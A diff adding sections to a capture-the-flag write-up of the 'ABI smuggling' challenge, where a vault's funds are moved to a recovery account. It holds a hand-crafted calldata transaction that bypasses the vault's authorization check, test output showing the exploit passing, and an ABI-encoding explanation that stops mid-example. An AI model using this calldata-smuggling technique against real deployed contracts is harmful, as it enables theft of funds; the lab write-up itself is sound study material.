@@ -177,5 +177,37 @@ The contract has an embedded generic authorization scheme, only allowing known a
 The dev team has received a responsible disclosure saying all funds can be stolen.
 Before it’s too late, rescue all funds from the vault, transferring them back to the recovery account.
 
+
+# ABI Encoding
+
+There two ways of encoding using the ABI. We can encode the datas with `.encode()` or `.encodePacked()` methods. But, the `.encodePacked()` method comes up with some problems.
+
+Let's give an example. Consider that we have `check` variable which must equal to `cybersecurity`.
+
+
+
 # Subverting
 
+Here are the attacker commands:
+
+```js
+await player.sendTransaction({
+            to: vault.address,
+            data: "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003C44CdDdB6a900fa2b585dd299e03d12FA4293BC0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000"
+        })
+```
+
+Solve the challenge.
+
+```powershell
+
+  [Challenge] ABI smuggling
+    ✔ Execution (184ms)
+
+
+  1 passing (2s)
+
+Done in 3.38s.
+```
+
+**_by wasny0ps_**
